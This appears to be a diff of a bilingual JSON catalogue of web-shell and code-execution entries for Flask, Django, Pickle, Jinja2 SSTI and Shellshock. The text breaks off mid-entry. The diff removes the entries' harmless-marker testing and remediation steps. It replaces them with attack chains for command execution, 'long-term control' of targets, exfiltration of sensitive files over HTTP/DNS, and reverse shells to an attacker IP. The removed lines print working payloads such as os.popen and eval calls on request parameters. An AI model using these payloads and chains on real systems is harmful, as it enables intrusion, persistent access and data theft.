@@ -1,6 +1,6 @@
 {
   "schemaVersion": 1,
-  "contentStandard": 2,
+  "contentStandard": 3,
   "sourcePrefix": "webshell",
   "entries": [
     {
@@ -23,63 +23,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Flask 请求参数命令执行片段用于核对Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数。该条目只在以下前提下适用：视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec。有效判定必须取得一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Flask Request-Parameter Command Execution Snippets checks whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation. It applies when a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec. A valid finding requires stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Flask 请求参数命令执行片段针对视图或调试代码把 request 参数直接交给 os.popen、subprocess、eval 或 exec 的场景。覆盖 request.args、form 与 values 三类取值入口进入执行 API 的代码形态。",
+          "en": "Flask request-parameter command-execution snippets target views or debug code passing request parameters straight into os.popen, subprocess, eval, or exec. It covers code forms where request.args, form, and values entries reach execution APIs."
         },
         "vulnerability": {
-          "zh": "风险根因是视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec，使应用可能暴露“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec, exposing the runtime boundary of whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "根因是视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec，HTTP 参数因此跨入 Python 执行边界。",
+          "en": "The root cause is views, template extensions, or debug helpers reading unconstrained cmd parameters from the request object into os.popen, os.system, subprocess, eval, or exec, letting HTTP parameters cross into the Python execution boundary."
         },
         "exploitation": {
-          "zh": "先以缺少 cmd 和普通文本参数建立错误处理基线，再逐个绑定真实 request 来源与原代码片段，使用无副作用固定标记确认调用路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "establish missing-cmd and plain-text error baselines, then bind each original snippet to the real request source and use a side-effect-free fixed marker to confirm the call path. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步逐条提交样例，在目标入口分别以 cmd=id 等 query、form 与 values 参数触发片段执行；命中判据为响应返回 uid= 的命令输出。三类取值入口逐一验证以确定参数来源；确认执行能力后替换为读取标记文件的命令形成证据。注意片段必须真实部署在目标代码路径中，代码存在或请求 200 都不构成命中。",
+          "en": "Submit the samples one by one per step 1, triggering snippet execution at the target entry with cmd=id style query, form, and values parameters; a hit is uid= command output in the response. Verify all three parameter-source entries to locate the input channel; once execution is confirmed, swap in marker-file reads for evidence. The snippet must be genuinely deployed on the target code path—code existence or a 200 response is not a hit."
         },
         "mitigation": {
-          "zh": "移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "remove direct request-to-evaluator mappings, use fixed operations and parameter allowlists, disable production debugging, and run the service under a low-privilege isolated identity. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务。修复后用相同入口重放正常业务参数与 cmd=id 样例，确认合法功能保留且危险 API 拒绝可控值。",
+          "en": "Remove direct request-to-dynamic-execution mappings in favor of fixed operations and parameter allowlists, disable the production debugger, and run the service under an isolated low-privilege account. After the fix, replay normal business parameters and the cmd=id sample through the same entry, confirming legitimate features work while dangerous APIs reject controlled input."
         },
         "difficulty": "intermediate"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Flask 请求参数命令执行片段”执行入口",
-            "en": "Confirm the Flask Request-Parameter Command Execution Snippets execution entry"
+            "zh": "定位 Flask 执行入口",
+            "en": "Locate a Flask execution sink"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec, and record runtime version and service identity."
+            "zh": "寻找 SSTI、调试器或把请求参数送入 popen 的代码路径。命中判据：表达式或参数能影响执行结果。",
+            "en": "Hunt SSTI, the debugger, or params flowing into popen. Success: input visibly affects execution."
           }
         },
         {
           "title": {
-            "zh": "建立“Flask 请求到命令执行”安全基线",
-            "en": "Establish the Flask Request-to-Command Execution baseline"
+            "zh": "注入请求参数执行片段",
+            "en": "Inject the request-arg snippet"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate as abnormal evidence."
+            "zh": "提交以 os.popen 读取 cmd 参数并返回结果的片段执行命令。命中判据：返回 id 的 uid=… 输出。",
+            "en": "Inject the os.popen(request.args.get('cmd')) snippet. Success: id returns uid= output."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“Flask 请求参数命令执行片段”",
-            "en": "Validate Flask Request-Parameter Command Execution Snippets line by line"
+            "zh": "切换参数来源适配场景",
+            "en": "Switch parameter sources to fit"
           },
           "description": {
-            "zh": "测试步骤为：先以缺少 cmd 和普通文本参数建立错误处理基线，再逐个绑定真实 request 来源与原代码片段，使用无副作用固定标记确认调用路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "establish missing-cmd and plain-text error baselines, then bind each original snippet to the real request source and use a side-effect-free fixed marker to confirm the call path. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "__import__('os').popen(request.args.get('cmd')).read()\n__import__('os').popen(request.form.get('cmd')).read()\n__import__('os').popen(request.values.get('cmd')).read()\n__import__('os').popen(request.args['cmd']).read()\n__import__('os').popen(request.form['cmd']).read()\n__import__('os').system(request.args.get('cmd'))\n__import__('os').system(request.form.get('cmd'))\n__import__('subprocess').check_output(request.args.get('cmd'),shell=True)\n__import__('subprocess').check_output(request.form.get('cmd'),shell=True)\n__import__('subprocess').getoutput(request.args.get('cmd'))\n__import__('subprocess').getoutput(request.form.get('cmd'))\neval(request.args.get('cmd'))\neval(request.form.get('cmd'))\nexec(request.args.get('cmd'))\nexec(request.form.get('cmd'))"
+            "zh": "用第 2 步的载荷换 args、form、values 等来源适配过滤与场景。命中判据：某来源稳定返回输出。",
+            "en": "Replay the step 2 snippet across args/form/values sources. Success: one source returns output reliably."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "建立稳定命令通道",
+            "en": "Establish a stable command channel"
           },
           "description": {
-            "zh": "实施“移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying remove direct request-to-evaluator mappings, use fixed operations and parameter allowlists, disable production debugging, and run the service under a low-privilege isolated identity, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "把执行入口封装成可重复调用的命令接口，维持对目标的长期控制。命中判据：可以按需执行任意系统命令，多次提交均能得到相同结果。",
+            "en": "Wrap the sink into a repeatable command endpoint. Success: arbitrary commands run on demand."
           }
         }
       ],
@@ -143,63 +146,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Python/Django 动态执行表达式用于核对应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API。该条目只在以下前提下适用：Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用。有效判定必须取得受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Python and Django Dynamic Execution Expressions checks whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs. It applies when Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls. A valid finding requires a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Python/Django 动态执行表达式针对业务代码、任务处理器或调试入口把用户输入拼入 eval、exec、os.system 或 shell=True 的场景。验证 os.system 系列语句是否真实执行可控表达式。",
+          "en": "Python/Django dynamic execution expressions target business code, task handlers, or debug entries concatenating user input into eval, exec, os.system, or shell=True. It validates whether os.system-style statements genuinely execute controlled expressions."
         },
         "vulnerability": {
-          "zh": "风险根因是Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用，使应用可能暴露“应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls, exposing the runtime boundary of whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "根因是 Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用，可控字符串因此从数据升级为 Python 表达式或子进程命令。",
+          "en": "The root cause is Django business code, task handlers, or debug tools concatenating user input into eval, exec, os.system, or shell=True calls, escalating controlled strings from data into Python expressions or child-process commands."
         },
         "exploitation": {
-          "zh": "先定位真实动态执行点并用算术表达式验证求值，再选择不调用外部网络的固定命令标记区分 eval、exec 与 subprocess 路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "locate the real dynamic evaluator and confirm evaluation with arithmetic before using a fixed non-network command marker to distinguish eval, exec, and subprocess paths. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步逐条提交 import os;os.system(...) 形式的语句到目标执行入口，命令覆盖 id、whoami、读标记与列目录；命中判据为语句执行后返回对应命令输出。确认执行能力后固定为读取标记文件形成证据；同时核对调用栈与工作进程日志，确认表达式确实进入求值或子进程 API，而不是模板插值或日志回显。",
+          "en": "Submit import os;os.system(...) style statements to the target execution entry one by one per step 1, with commands covering id, whoami, marker reads, and directory listings; a hit is the corresponding command output returned after statement execution. Once execution is confirmed, standardize on marker-file reads for evidence; cross-check call stacks and worker logs to confirm the expression truly reached evaluation or child-process APIs rather than template interpolation or log echo."
         },
         "mitigation": {
-          "zh": "删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "remove dynamic evaluation and shell=True, call fixed functions or subprocess argument arrays with typed parameters, and independently authorize background tasks and management entry points. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权。修复后用相同入口重放正常业务参数与第 1 步语句，确认合法功能保留且求值 API 拒绝可控值。",
+          "en": "Remove dynamic evaluation and shell=True, call fixed functions with typed parameters or subprocess argument arrays, and apply independent authorization to background tasks and admin entries. After the fix, replay normal business parameters and the step-1 statements through the same entry, confirming legitimate features work while evaluation APIs reject controlled input."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Python/Django 动态执行表达式”执行入口",
-            "en": "Confirm the Python and Django Dynamic Execution Expressions execution entry"
+            "zh": "定位 Django 动态执行点",
+            "en": "Locate a Django dynamic sink"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls, and record runtime version and service identity."
+            "zh": "寻找把用户输入送入 eval、exec 或 shell=True 调用的业务代码。命中判据：输入能进入动态执行。",
+            "en": "Find user input reaching eval/exec/shell=True in views or tasks. Success: input reaches dynamic execution."
           }
         },
         {
           "title": {
-            "zh": "建立“Python 动态求值与子进程”安全基线",
-            "en": "Establish the Python Dynamic Evaluation and Subprocesses baseline"
+            "zh": "提交命令执行语句",
+            "en": "Submit command-execution statements"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log as abnormal evidence."
+            "zh": "提交 os.system 语句执行 id、whoami 与文件读取。命中判据：响应返回对应命令输出。",
+            "en": "Feed os.system statements running id, whoami and file reads. Success: matching output returns."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“Python/Django 动态执行表达式”",
-            "en": "Validate Python and Django Dynamic Execution Expressions line by line"
+            "zh": "换 subprocess 变体适配",
+            "en": "Switch to subprocess variants"
           },
           "description": {
-            "zh": "测试步骤为：先定位真实动态执行点并用算术表达式验证求值，再选择不调用外部网络的固定命令标记区分 eval、exec 与 subprocess 路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "locate the real dynamic evaluator and confirm evaluation with arithmetic before using a fixed non-network command marker to distinguish eval, exec, and subprocess paths. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "import os;os.system('id')\nimport os;os.system('whoami')\nimport os;os.system('cat /flag')\nimport os;os.system('ls /')\nimport subprocess;subprocess.check_output('id',shell=True)\nimport subprocess;subprocess.check_output('whoami',shell=True)\nimport subprocess;subprocess.check_output('cat /flag',shell=True)\nimport subprocess;subprocess.check_output('ls /',shell=True)\nimport subprocess;subprocess.getoutput('id')\nimport subprocess;subprocess.getoutput('whoami')\nimport subprocess;subprocess.getoutput('cat /flag')\nimport subprocess;subprocess.getoutput('ls /')\neval('__import__(\"os\").system(\"id\")')\neval('__import__(\"os\").system(\"whoami\")')\neval('__import__(\"os\").system(\"cat /flag\")')\neval('__import__(\"os\").system(\"ls /\")')\nexec('import os;os.system(\"id\")')\nexec('import os;os.system(\"whoami\")')\nexec('import os;os.system(\"cat /flag\")')\nexec('import os;os.system(\"ls /\")')"
+            "zh": "改用 subprocess.check_output 形式执行，适配被限制的调用路径。命中判据：输出正常返回。",
+            "en": "Retry with subprocess.check_output forms. Success: output still returns."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "读取目标数据外带",
+            "en": "Read and exfiltrate target data"
           },
           "description": {
-            "zh": "实施“删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying remove dynamic evaluation and shell=True, call fixed functions or subprocess argument arrays with typed parameters, and independently authorize background tasks and management entry points, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "执行敏感文件读取并把结果经 HTTP 或 DNS 通道外带出去。命中判据：接收端收到完整的数据内容。",
+            "en": "Read sensitive files and exfiltrate over HTTP/DNS. Success: the collector receives the data."
           }
         }
       ],
@@ -263,20 +269,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Python Pickle Reduce 指令流检查Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数。成立前提为：服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护。反序列化风险必须通过隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。",
-          "en": "Python Pickle Reduce Opcode Streams checks whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions. It applies when the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection. Deserialization risk requires an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes; a stream header, class name, or tag alone does not prove object loading or side effects."
+          "zh": "Python Pickle Reduce 指令流针对服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads 的场景：GLOBAL 与 REDUCE 指令可在反序列化期调用进程执行。验证协议 0 指令流是否被真实加载。",
+          "en": "Python Pickle Reduce opcode streams target services calling pickle.loads on cookies, caches, queues, or uploads: GLOBAL and REDUCE opcodes invoke process execution during deserialization. It validates whether protocol-0 opcode streams are genuinely loaded."
         },
         "vulnerability": {
-          "zh": "根因是服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护，不可信数据因此可能触发“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。",
-          "en": "The root cause is the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection, allowing whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate."
+          "zh": "根因是服务对不可信数据调用 pickle.loads 且缺少来源与完整性保护；GLOBAL、REDUCE 等操作码在反序列化期间解析模块成员并调用函数，攻击者可借应用依赖中的可调用对象构造执行链。",
+          "en": "The root cause is services calling pickle.loads on untrusted data without origin or integrity protection; opcodes like GLOBAL and REDUCE resolve module members and invoke functions during deserialization, letting attackers build execution chains from callable objects in application dependencies."
         },
         "exploitation": {
-          "zh": "在一次性进程中先加载正常业务对象，再用仅写入临时标记的等价 reduce 对象替换原命令，比较反序列化前后的进程行为。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。",
-          "en": "load a normal business object in a disposable process, then replace the original command with an equivalent reduce object that only writes a temporary marker and compare process behavior. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access."
+          "zh": "按第 1 步逐条提交 protocol 0 的 GLOBAL/REDUCE 指令流（cos system 包裹 id、whoami 等命令），记录响应与日志差异；命中判据为 opcode 流被 loads 后执行对应命令并返回输出。确认执行能力后替换为读取标记文件的等价流形成证据；Cookie 入口需按其编码方式（Base64/签名）处理后提交，注意区分流头识别、对象实例化与最终副作用四个阶段。",
+          "en": "Submit the protocol-0 GLOBAL/REDUCE opcode streams one by one per step 1 (cos system wrapping id, whoami, and similar commands), recording response and log differences; a hit is the command executed and output returned after loads(). Once execution is confirmed, substitute equivalent streams reading marker files for evidence; for cookie entries, process per its encoding (Base64/signature) before submitting, and keep the four stages—stream recognition, object instantiation, gadget triggering, and final side effects—distinct."
         },
         "mitigation": {
-          "zh": "不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。",
-          "en": "do not use Pickle for untrusted data; use data-only formats such as JSON, or verify signatures, isolate the loader, reduce privileges, and retire legacy serialized tokens. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes."
+          "zh": "不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌。修复后同时重放合法数据对象、类型越界对象和第 1 步指令流，确认业务数据可读而语言对象与函数源码被稳定拒绝。",
+          "en": "Stop using Pickle on untrusted data in favor of JSON-style formats; where compatibility is required, verify signatures, isolate the loading process, restrict permissions, and retire old serialization tokens. After the fix, replay valid data objects, type-violating objects, and the step-1 opcode streams together, confirming business data reads while language objects and function sources are stably rejected."
         },
         "difficulty": "advanced"
       },
@@ -2478,20 +2484,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Jinja2 SSTI 进程执行链验证模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess。它要求不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程。成功证据为模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联；算术表达式成立只能证明模板求值，外连命令文本出现也不能证明已经越过对象与进程边界。",
-          "en": "Jinja2 SSTI Process Execution Chains tests whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess. It requires an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes. Success requires the template resolution path, render log, fixed child-process marker, and request identifier fully correlate; arithmetic proves template evaluation only, and reflected reverse-command text does not prove process execution."
+          "zh": "覆盖 Jinja2 SSTI 到进程执行的升级链验证：以 Flask globals、Python 子类枚举与 builtins 导入三类对象图链触发反向 shell，确认模板注入跨越沙箱到达进程执行。",
+          "en": "Covers escalation-chain verification from Jinja2 SSTI to process execution: triggering reverse shells via three object-graph chains — Flask globals, Python subclass enumeration, and builtins imports — confirming template injection crosses the sandbox into process execution."
         },
         "vulnerability": {
-          "zh": "根因是不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程，Jinja2 对象解析因此可能到达“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。影响取决于模板来源、沙箱属性策略、可见 globals、Python 版本与 worker 权限，需要分阶段证明表达式、对象访问和进程调用。",
-          "en": "The root cause is an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes, allowing Jinja2 resolution toward whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess. Impact depends on template provenance, sandbox attribute policy, exposed globals, Python version, and worker privilege, so expression, object access, and process invocation require separate proof."
+          "zh": "根因是不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程；对象解析链是否可达 os/subprocess 取决于模板上下文暴露面。",
+          "en": "The root cause is untrusted strings compiled by Jinja2 as template source with sandboxing off or attribute policies bypassable, while the process account allows spawning children; whether object-resolution chains reach os/subprocess depends on template-context exposure."
         },
         "exploitation": {
-          "zh": "先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每次只验证一条对象链，将所有反连动作改为固定 stdout 标记，记录模板源码、渲染结果、属性访问拒绝和子进程日志，并在取得最小证据后停止。",
-          "en": "establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Validate one object chain per run, replace all reverse behavior with fixed stdout markers, retain template source, render result, denied attributes, and child logs, and stop after minimal proof."
+          "zh": "使用第 1 步命令以三种 Jinja2 对象图链触发反向 shell，{ATTACKER_IP}:{LPORT} 渲染为授权监听地址；监听端收到回连会话即确认 SSTI 到进程执行链成立。仅在授权实验环境执行；先用算术与安全属性访问建立 SSTI 基线，再把反连命令替换为固定 stdout 标记逐条确认三类对象链，取得最小证据后停止。",
+          "en": "Use the step 1 command to trigger reverse shells via the three Jinja2 object-graph chains, with {ATTACKER_IP}:{LPORT} rendered as the authorized listener; the listener receiving a callback session confirms the SSTI-to-process-execution chain. Execute only in authorized labs; baseline SSTI with arithmetic and safe property access first, then swap callback commands for fixed stdout markers verifying each object chain, stopping at minimal evidence."
         },
         "mitigation": {
-          "zh": "禁止将用户内容作为模板源码，使用固定模板和数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程。回归使用固定模板、合法数据、算术探针和原对象链，确认业务渲染保留，而不可信内容始终作为数据处理且无法访问 globals、类型对象或进程 API。",
-          "en": "never compile user content as template source, use fixed templates with data parameters, enforce strict sandbox attribute policy, run with least privilege, and prevent template workers from spawning processes. Regress fixed templates, valid data, arithmetic probes, and original object chains to preserve rendering while untrusted content remains data and cannot reach globals, type objects, or process APIs."
+          "zh": "禁止将用户内容作为模板源码，使用固定模板与数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程；回归确认不可信内容始终作为数据处理且无法访问 globals、类型对象或进程 API。",
+          "en": "Never use user content as template source — fixed templates with data parameters instead; enable and tighten sandbox attribute policies, run low-privileged, and block template processes from spawning children; regress to confirm untrusted content stays data and cannot reach globals, type objects, or process APIs."
         },
         "difficulty": "expert"
       },
@@ -2601,63 +2607,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Shellshock CGI 环境变量命令执行用于验证 CVE-2014-6271 的完整数据流：HTTP Cookie 或 User-Agent 经 CGI 转换为环境变量，CGI 脚本或其子进程再启动存在缺陷的 Bash，Bash 导入函数定义时错误执行尾随文本。适用前提是明确授权的隔离旧版 Bash CGI 实例、可核验的 Bash 补丁状态、可观察的 CGI 子进程日志，以及替代反连命令的无副作用固定标记。只有请求头、CGI 进程、Bash 版本和固定输出属于同一次请求时才可判定。",
-          "en": "Shellshock CGI Environment-Variable Command Execution validates the complete CVE-2014-6271 flow: an HTTP Cookie or User-Agent becomes a CGI environment variable, a CGI script or child launches vulnerable Bash, and Bash incorrectly executes text trailing an imported function definition. It requires an explicitly authorized isolated legacy Bash CGI instance, verifiable patch status, observable CGI child-process logs, and a side-effect-free fixed marker replacing reverse-shell commands. A finding requires the header, CGI process, Bash version, and fixed output to correlate to one request."
+          "zh": "Shellshock CGI 环境变量命令执行针对 CVE-2014-6271 的完整数据流：HTTP 请求头经 CGI 转为环境变量，再由存在缺陷的 Bash 在导入函数定义时执行尾随文本。验证 Cookie 与 User-Agent 两类投递通道。",
+          "en": "Shellshock CGI environment-variable command execution targets the full CVE-2014-6271 data flow: HTTP headers become CGI environment variables, then vulnerable Bash executes trailing text when importing function definitions. It validates the Cookie and User-Agent delivery channels."
         },
         "vulnerability": {
-          "zh": "漏洞根因是受影响 Bash 在从环境变量恢复函数时没有在函数体结束处停止解析，导致函数定义后的命令也被执行。CGI 服务器通常把请求头转换为 HTTP_COOKIE、HTTP_USER_AGENT 等环境变量；只有后续组件确实调用受影响 Bash 时，这条输入链才成立。CGI 可访问、服务器使用其他 Shell、Bash 已修复或请求头只被日志记录时，不构成该 RCE。",
-          "en": "The flaw exists because affected Bash versions fail to stop parsing after restoring a function from an environment variable and execute commands following the function body. CGI servers commonly map headers to variables such as HTTP_COOKIE and HTTP_USER_AGENT, but the chain exists only when a downstream component invokes affected Bash. A reachable CGI, a different shell, patched Bash, or header logging without Bash parsing does not establish this RCE."
+          "zh": "漏洞根因是受影响 Bash 从环境变量恢复函数时不在函数体结束处停止解析，导致函数定义后的命令也被执行；只有后续组件确实调用受影响 Bash 时这条输入链才成立。",
+          "en": "The root cause is affected Bash failing to stop parsing at the end of a function body when restoring functions from environment variables, so commands after the definition also execute; the chain holds only when a downstream component actually invokes vulnerable Bash."
         },
         "exploitation": {
-          "zh": "原始五行均会尝试建立交互式反连，审核时已通过 command override 保留 Cookie/User-Agent、函数定义和 CGI 路径结构，并把尾随部分替换为本地 printf 固定标记、127.0.0.1 隔离目标和五秒超时。逐个 Header 和 CGI 路径低频验证，并与已修复 Bash 实例对照；任何外连、Shell、写文件或真实数据读取都不是本条所需证据。",
